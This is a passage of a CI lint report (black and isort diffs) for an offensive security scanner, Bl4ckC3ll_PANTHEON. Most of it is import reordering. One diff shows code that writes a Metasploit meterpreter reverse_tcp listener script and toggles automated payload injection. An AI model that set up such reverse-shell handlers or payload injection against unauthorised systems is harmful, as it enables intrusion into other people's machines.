\"SUCCESS\")\n \n         # In test mode, just log what would be done\n         if test_mode:\n-            logger.log(\"Test mode enabled - payloads generated but not executed\", \"INFO\")\n-            logger.log(\"To enable payload injection, set test_mode: false in configuration\", \"INFO\")\n+            logger.log(\n+                \"Test mode enabled - payloads generated but not executed\", \"INFO\"\n+            )\n+            logger.log(\n+                \"To enable payload injection, set test_mode: false in configuration\",\n+                \"INFO\",\n+            )\n         else:\n-            logger.log(\"Payload injection is enabled - use responsibly and only on authorized targets\", \"WARNING\")\n+            logger.log(\n+                \"Payload injection is enabled - use responsibly and only on authorized targets\",\n+                \"WARNING\",\n+            )\n \n         # Create listener setup script\n         listener_script = payload_scripts_dir / \"setup_listener.sh\"\n-        with open(listener_script, 'w') as f:\n-            f.write(\"\"\"#!/bin/bash\n+        with open(listener_script, \"w\") as f:\n+            f.write(\n+                \"\"\"#!/bin/bash\n # Metasploit listener setup for {lhost}:{lport}\n echo \"Setting up Metasploit listener...\"\n msfconsole -x \"use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run\"\n-\"\"\")\n+\"\"\"\n+            )\n         listener_script.chmod(0o755)\n \n         logger.log(f\"Listener setup script: {listener_script}\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"Automated payload injection failed: {e}\", \"ERROR\")\n+\n \n def run_comprehensive_fuzzing(rd, env, cfg):\n     \"\"\"Run comprehensive fuzzing with BCAR integration\"\"\"\n     logger.log(\"Starting Comprehensive Fuzzing...\", \"INFO\")\n \n     try:\n         # Get targets for fuzzing\n         targets = []\n-        if hasattr(rd, 'discovered_urls'):\n+        if hasattr(rd, \"discovered_urls\"):\n             targets = rd.discovered_urls\n         else:\n             # Try to get from HTTP probe results\n             http_results_file = rd.run_dir / \"http_probe_results.json\"\n             if http_results_file.exists():\n-                with open(http_results_file, 'r') as f:\n+                with open(http_results_file, \"r\") as f:\n                     http_data = json.load(f)\n                     if isinstance(http_data, list):\n-                        targets = [item.get('url', '') for item in http_data if 'url' in item]\n+                        targets = [\n+                            item.get(\"url\", \"\") for item in http_data if \"url\" in item\n+                        ]\n \n         if not targets:\n             logger.log(\"No HTTP targets found for fuzzing\", \"ERROR\")\n             return\n \n@@ -10498,51 +12851,74 @@\n                 logger.log(f\"Fuzzing: {target}\", \"INFO\")\n                 try:\n                     findings = bcar.advanced_fuzzing(target)\n                     if findings:\n                         fuzzing_results.extend(findings)\n-                        logger.log(f\"Found {len(findings)} interesting paths on {target}\", \"INFO\")\n+                        logger.log(\n+                            f\"Found {len(findings)} interesting paths on {target}\",\n+                            \"INFO\",\n+                        )\n                 except Exception as e:\n                     logger.log(f\"Fuzzing failed for {target}: {e}\", \"WARNING\")\n \n         # Fallback to basic directory enumeration\n         else:\n             logger.log(\"Using basic fuzzing (BCAR not available)\", \"INFO\")\n             common_paths = [\n-                'admin', 'login', 'dashboard', 'config', 'backup', 'test', 'dev',\n-                'api', 'robots.txt', '.well-known', 'sitemap.xml'\n+                \"admin\",\n+                \"login\",\n+                \"dashboard\",\n+                \"config\",\n+                \"backup\",\n+                \"test\",\n+                \"dev\",\n+                \"api\",\n+                \"robots.txt\",\n+                \".well-known\",\n+                \"sitemap.xml\",\n             ]\n \n             for target in targets[:5]:  # Limit for demo\n                 for path in common_paths:\n                     try:\n                         import requests\n+\n                         url = f\"{target.rstrip('/')}/{path}\"\n                         response = requests.get(url, timeout=5, allow_redirects=False)\n                         if response.status_code in [200, 301, 302, 403]:\n-                            fuzzing_results.append({\n-                                'url': url,\n-                                'status_code': response.status_code,\n-                                'content_length': len(response.content)\n-                            })\n+                            fuzzing_results.append(\n+                                {\n+                                    \"url\": url,\n+                                    \"status_code\": response.status_code,\n+                                    \"content_length\": len(response.content),\n+                                }\n+                            )\n                     except Exception:\n                         continue\n \n         # Save fuzzing results\n         fuzzing_file = rd.run_dir / \"comprehensive_fuzzing_results.json\"\n-        with open(fuzzing_file, 'w') as f:\n-            json.dump({\n-                'timestamp': datetime.now().isoformat(),\n-                'targets_fuzzed': len(targets),\n-                'findings': fuzzing_results\n-            }, f, indent=2)\n+        with open(fuzzing_file, \"w\") as f:\n+            json.dump(\n+                {\n+                    \"timestamp\": datetime.now().isoformat(),\n+                    \"targets_fuzzed\": len(targets),\n+                    \"findings\": fuzzing_results,\n+                },\n+                f,\n+                indent=2,\n+            )\n \n         logger.log(f\"Fuzzing results saved to: {fuzzing_file}\", \"SUCCESS\")\n-        logger.log(f\"Fuzzing complete: {len(fuzzing_results)} interesting paths discovered\", \"INFO\")\n+        logger.log(\n+            f\"Fuzzing complete: {len(fuzzing_results)} interesting paths discovered\",\n+            \"INFO\",\n+        )\n \n     except Exception as e:\n         logger.log(f\"Comprehensive fuzzing failed: {e}\", \"ERROR\")\n+\n \n if __name__ == \"__main__\":\n     try:\n         main()\n     except KeyboardInterrupt:\n",
      "stderr": "would reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/cicd_integration.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bcar.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/comprehensive_test_suite.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/config_validator.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/diagnostics.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/demo_enhanced_reporting.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanner.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_pantheon_master.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_test_suite.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanning.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_tool_manager.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_validation.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_report_controller.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_wordlists.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/error_handler.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/final_integration_test.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/fallback_scanner.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/advanced_osint.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/performance_monitor.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/api_security_scanner.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/cloud_security_scanner.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/nuclei_template_manager.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/enhanced_fuzzing.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/intelligent_report_engine.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/quick_functional_test.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/docs_validator.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/comprehensive_test_framework.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_debugger.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_repo_manager.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/master_workflow_automation.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_config.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/security_validator.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/performance_tester.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_monitor.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_optimizer.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_utils.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_orchestrator.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_automation_integration.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_installation.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/__init__.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_validation.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/app.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/__init__.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/backend_integration.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_enhanced_reporting.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/main_dashboard.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/reports.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/scan_runner.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/__init__.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/log_viewer.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/settings.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/scan_progress.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/targets.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/system_monitor.py\nwould reformat /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_p4nth30n.py\n\nOh no! \ud83d\udca5 \ud83d\udc94 \ud83d\udca5\n55 files would be reformatted.\n",
      "timestamp": "2025-09-14T19:23:18.175602"
    },
    {
      "name": "isort Import Sorting Check",
      "success": false,
      "duration": 0.576606273651123,
      "returncode": 1,
      "stdout": "--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_validation.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_validation.py:after\t2025-09-14 19:23:18.272804\n@@ -4,30 +4,34 @@\n Tests and validates the 96% success rate achievement across all components\n \"\"\"\n \n+import json\n import os\n-import json\n+import subprocess\n+import tempfile\n+import threading\n import time\n-import tempfile\n+import unittest\n+from datetime import datetime\n from pathlib import Path\n-from datetime import datetime\n-from typing import Dict, List, Any, Tuple\n-import unittest\n-import subprocess\n-import threading\n+from typing import Any, Dict, List, Tuple\n \n # Enhanced modules imports\n try:\n-    from enhanced_scanning import run_enhanced_scanning, get_current_success_rate\n-    from enhanced_tool_manager import get_tool_coverage_report, check_tool_availability\n-    from enhanced_validation import validate_target_input, validate_targets_file\n-    from performance_monitor import (\n-        start_performance_monitoring, stop_performance_monitoring,\n-        record_operation_result, get_current_performance_metrics\n-    )\n-    from success_rate_orchestrator import (\n-        start_success_rate_monitoring, stop_success_rate_monitoring,\n-        get_success_rate_report, force_improvements, is_target_success_rate_achieved\n-    )\n+    from enhanced_scanning import (get_current_success_rate,\n+                                   run_enhanced_scanning)\n+    from enhanced_tool_manager import (check_tool_availability,\n+                                       get_tool_coverage_report)\n+    from enhanced_validation import (validate_target_input,\n+                                     validate_targets_file)\n+    from performance_monitor import (get_current_performance_metrics,\n+                                     record_operation_result,\n+                                     start_performance_monitoring,\n+                                     stop_performance_monitoring)\n+    from success_rate_orchestrator import (force_improvements,\n+                                           get_success_rate_report,\n+                                           is_target_success_rate_achieved,\n+                                           start_success_rate_monitoring,\n+                                           stop_success_rate_monitoring)\n     ALL_MODULES_AVAILABLE = True\n except ImportError as e:\n     print(f\"\u26a0\ufe0f Some enhanced modules not available: {e}\")\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_p4nth30n.py:before\t2025-09-14 19:10:58.549754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_p4nth30n.py:after\t2025-09-14 19:23:18.404672\n@@ -6,61 +6,60 @@\n # - Exploitation stage is intentionally a no-op placeholder. Only scan/report is implemented.\n # - External tools (subfinder, amass, naabu, httpx, nuclei) are optional; the code skips gracefully when missing.\n \n+import argparse\n+import importlib.util\n+import json\n+import logging\n import os\n+import platform\n+import shlex\n+import shutil\n+import subprocess\n import sys\n-import shlex\n-import json\n+import tempfile\n+import threading\n import time\n-import subprocess\n-import platform\n-import tempfile\n-import shutil\n import uuid\n-import threading\n import webbrowser\n-import logging\n-import argparse\n+from concurrent.futures import ThreadPoolExecutor, as_completed\n+from datetime import datetime\n from pathlib import Path\n-from datetime import datetime\n-from typing import Dict, List, Any, Optional, Tuple\n-from concurrent.futures import ThreadPoolExecutor, as_completed\n-import importlib.util\n+from typing import Any, Dict, List, Optional, Tuple\n \n # Enhanced modules integration\n try:\n-    from enhanced_scanning import (\n-        adaptive_scan_manager, enhanced_scanner, \n-        get_current_success_rate, run_enhanced_scanning\n-    )\n+    from enhanced_scanning import (adaptive_scan_manager, enhanced_scanner,\n+                                   get_current_success_rate,\n+                                   run_enhanced_scanning)\n     ENHANCED_SCANNING_AVAILABLE = True\n except ImportError:\n     ENHANCED_SCANNING_AVAILABLE = False\n \n try:\n-    from enhanced_tool_manager import (\n-        tool_manager, enhanced_which, check_tool_availability,\n-        install_missing_tools, get_tool_coverage_report\n-    )\n+    from enhanced_tool_manager import (check_tool_availability, enhanced_which,\n+                                       get_tool_coverage_report,\n+                                       install_missing_tools, tool_manager)\n     ENHANCED_TOOL_MANAGER_AVAILABLE = True\n except ImportError:\n     ENHANCED_TOOL_MANAGER_AVAILABLE = False\n \n try:\n-    from enhanced_validation import (\n-        enhanced_validator, reliability_tracker,\n-        validate_target_input, validate_targets_file,\n-        get_system_reliability_score\n-    )\n+    from enhanced_validation import (enhanced_validator,\n+                                     get_system_reliability_score,\n+                                     reliability_tracker,\n+                                     validate_target_input,\n+                                     validate_targets_file)\n     ENHANCED_VALIDATION_AVAILABLE = True\n except ImportError:\n     ENHANCED_VALIDATION_AVAILABLE = False\n \n try:\n-    from performance_monitor import (\n-        performance_monitor, start_performance_monitoring,\n-        stop_performance_monitoring, record_operation_result,\n-        get_current_performance_metrics, is_success_rate_target_met\n-    )\n+    from performance_monitor import (get_current_performance_metrics,\n+                                     is_success_rate_target_met,\n+                                     performance_monitor,\n+                                     record_operation_result,\n+                                     start_performance_monitoring,\n+                                     stop_performance_monitoring)\n     PERFORMANCE_MONITOR_AVAILABLE = True\n except ImportError:\n     PERFORMANCE_MONITOR_AVAILABLE = False\n@@ -77,7 +76,6 @@\n from threading import Lock\n \n \n-\n class RateLimiter:\n     \"\"\"Thread-safe rate limiter for security\"\"\"\n \n@@ -121,15 +119,14 @@\n rate_limiter = RateLimiter()\n \n \n+import functools\n+import ipaddress\n # SECURITY: Input validation imports\n import re\n-import ipaddress\n+import time\n+from typing import Any, Callable\n from urllib.parse import urlparse\n \n-\n-import functools\n-import time\n-from typing import Callable, Any\n \n # Performance monitoring decorator\n def monitor_performance(func_name: str = None):\n@@ -10115,7 +10112,8 @@\n     \"\"\"Search Certificate Transparency logs for subdomains with performance optimization\"\"\"\n     try:\n         # Try to use optimized version if available\n-        from performance_optimizer import optimize_certificate_transparency_search\n+        from performance_optimizer import \\\n+            optimize_certificate_transparency_search\n         result = optimize_certificate_transparency_search(f\"%25.{domain}\", limit=100)\n         if result:\n             return result\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/performance_monitor.py:before\t2025-09-14 19:10:58.579755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/performance_monitor.py:after\t2025-09-14 19:23:18.425940\n@@ -4,18 +4,20 @@\n Real-time monitoring with intelligent parameter tuning to achieve 96% success rate\n \"\"\"\n \n+import json\n+import logging\n import os\n-import json\n+import statistics\n+import threading\n import time\n+from collections import defaultdict, deque\n+from dataclasses import dataclass, field\n+from datetime import datetime, timedelta\n+from pathlib import Path\n+from typing import Any, Dict, List, Optional, Tuple\n+\n import psutil\n-import threading\n-from pathlib import Path\n-from datetime import datetime, timedelta\n-from typing import Dict, List, Any, Optional, Tuple\n-from dataclasses import dataclass, field\n-from collections import deque, defaultdict\n-import statistics\n-import logging\n+\n \n @dataclass\n class PerformanceSnapshot:\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/final_integration_test.py:before\t2025-09-14 19:10:58.551754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/final_integration_test.py:after\t2025-09-14 19:23:18.431464\n@@ -3,12 +3,12 @@\n Final comprehensive integration test for enhanced Bl4ckC3ll_PANTHEON\n \"\"\"\n \n+import json\n+import shutil\n+import subprocess\n import sys\n-import subprocess\n-import shutil\n+import time\n from pathlib import Path\n-import json\n-import time\n \n # Add current directory to path\n sys.path.insert(0, str(Path(__file__).parent))\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/cicd_integration.py:before\t2025-09-14 19:10:58.549754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/cicd_integration.py:after\t2025-09-14 19:23:18.439404\n@@ -4,14 +4,14 @@\n Provides automated security scanning capabilities for continuous integration\n \"\"\"\n \n+import argparse\n+import json\n import os\n+import subprocess\n import sys\n-import json\n-import argparse\n-import subprocess\n import time\n from pathlib import Path\n-from typing import Dict, Any, List\n+from typing import Any, Dict, List\n \n # Add current directory to path for imports\n sys.path.insert(0, str(Path(__file__).parent))\n@@ -125,7 +125,7 @@\n         try:\n             # Import the main scanner\n             import bl4ckc3ll_p4nth30n as scanner\n-            \n+\n             # Load configuration\n             cfg = scanner.load_cfg()\n             \n@@ -160,7 +160,7 @@\n         try:\n             # Import the main scanner\n             import bl4ckc3ll_p4nth30n as scanner\n-            \n+\n             # Load configuration\n             cfg = scanner.load_cfg()\n             \n@@ -202,7 +202,7 @@\n         try:\n             # Import the main scanner\n             import bl4ckc3ll_p4nth30n as scanner\n-            \n+\n             # Load configuration - focus on API testing\n             cfg = scanner.load_cfg()\n             cfg[\"advanced_scanning\"] = {\n@@ -243,7 +243,7 @@\n         try:\n             # Import the main scanner\n             import bl4ckc3ll_p4nth30n as scanner\n-            \n+\n             # Load configuration - focus on cloud security\n             cfg = scanner.load_cfg()\n             cfg[\"advanced_scanning\"] = {\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_wordlists.py:before\t2025-09-14 19:10:58.550754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_wordlists.py:after\t2025-09-14 19:23:18.448969\n@@ -4,12 +4,12 @@\n Generates comprehensive wordlists and payloads for advanced security testing\n \"\"\"\n \n+import base64\n import json\n import os\n+import urllib.parse\n from pathlib import Path\n-from typing import Dict, List, Any\n-import urllib.parse\n-import base64\n+from typing import Any, Dict, List\n \n # Get project paths\n HERE = Path(__file__).parent\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/config_validator.py:before\t2025-09-14 19:10:58.549754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/config_validator.py:after\t2025-09-14 19:23:18.454367\n@@ -6,8 +6,8 @@\n \n import json\n import re\n-from typing import Dict, List, Any, Tuple, Optional\n from pathlib import Path\n+from typing import Any, Dict, List, Optional, Tuple\n \n \n class ConfigValidator:\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_automation_integration.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_automation_integration.py:after\t2025-09-14 19:23:18.458693\n@@ -4,13 +4,14 @@\n Tests the new ESLint integration, bug bounty commands, and automated testing chain\n \"\"\"\n \n+import json\n import os\n+import subprocess\n import sys\n-import pytest\n-import json\n-import subprocess\n import tempfile\n from pathlib import Path\n+\n+import pytest\n \n \n def test_eslint_integration():\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bcar.py:before\t2025-09-14 19:10:58.547754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bcar.py:after\t2025-09-14 19:23:18.466720\n@@ -8,24 +8,26 @@\n Integration: Bl4ckC3ll_PANTHEON\n \"\"\"\n \n+import base64\n+import json\n+import logging\n import os\n-import sys\n-import json\n-import time\n-import threading\n-import requests\n-import subprocess\n import re\n-from urllib.parse import urlparse, urljoin\n-from pathlib import Path\n-from datetime import datetime, timedelta\n-from typing import Dict, List, Set, Optional, Tuple, Any\n-from concurrent.futures import ThreadPoolExecutor, as_completed\n import socket\n import ssl\n-import base64\n-from dataclasses import dataclass, asdict\n-import logging\n+import subprocess\n+import sys\n+import threading\n+import time\n+from concurrent.futures import ThreadPoolExecutor, as_completed\n+from dataclasses import asdict, dataclass\n+from datetime import datetime, timedelta\n+from pathlib import Path\n+from typing import Any, Dict, List, Optional, Set, Tuple\n+from urllib.parse import urljoin, urlparse\n+\n+import requests\n+\n \n # Advanced Certificate Transparency and Subdomain Discovery\n class BCARCore:\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/fallback_scanner.py:before\t2025-09-14 19:10:58.551754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/fallback_scanner.py:after\t2025-09-14 19:23:18.473713\n@@ -4,17 +4,19 @@\n Provides high-reliability scanning even when external tools are unavailable\n \"\"\"\n \n+import json\n import os\n-import json\n-import time\n import socket\n import ssl\n import threading\n+import time\n+from datetime import datetime\n+from pathlib import Path\n+from typing import Any, Dict, List, Optional, Tuple\n+from urllib.parse import urlparse\n+\n import requests\n-from pathlib import Path\n-from datetime import datetime\n-from typing import Dict, List, Any, Optional, Tuple\n-from urllib.parse import urlparse\n+\n try:\n     import dns.resolver\n     DNS_AVAILABLE = True\n@@ -22,6 +24,7 @@\n     DNS_AVAILABLE = False\n import concurrent.futures\n from dataclasses import dataclass, field\n+\n \n @dataclass\n class ScanResult:\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_tool_manager.py:before\t2025-09-14 19:10:58.550754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_tool_manager.py:after\t2025-09-14 19:23:18.479350\n@@ -4,18 +4,19 @@\n Provides intelligent tool detection, installation, and fallback mechanisms\n \"\"\"\n \n+import json\n import os\n+import shutil\n+import subprocess\n import sys\n-import json\n-import subprocess\n+import tempfile\n+import threading\n import time\n-import shutil\n-from pathlib import Path\n-from typing import Dict, List, Tuple, Optional, Any\n from dataclasses import dataclass, field\n from datetime import datetime\n-import threading\n-import tempfile\n+from pathlib import Path\n+from typing import Any, Dict, List, Optional, Tuple\n+\n \n # Tool configuration\n @dataclass\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_installation.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_installation.py:after\t2025-09-14 19:23:18.481581\n@@ -1,16 +1,17 @@\n #!/usr/bin/env python3\n \"\"\"Test script to validate Bl4ckC3ll_PANTHEON installation\"\"\"\n \n+import shutil\n+import subprocess\n import sys\n-import subprocess\n-import shutil\n from pathlib import Path\n+\n \n def test_python_deps():\n     \"\"\"Test Python dependencies\"\"\"\n     try:\n+        import distro\n         import psutil\n-        import distro\n         print(\"\u2713 Python dependencies available\")\n         return True\n     except ImportError as e:\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_test_suite.py:before\t2025-09-14 19:10:58.550754\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_test_suite.py:after\t2025-09-14 19:23:18.487491\n@@ -4,14 +4,14 @@\n Tests all new features and improvements including CLI, wordlists, and scanning\n \"\"\"\n \n+import json\n+import os\n+import subprocess\n+import sys\n+import tempfile\n+import time\n import unittest\n-import subprocess\n-import json\n-import 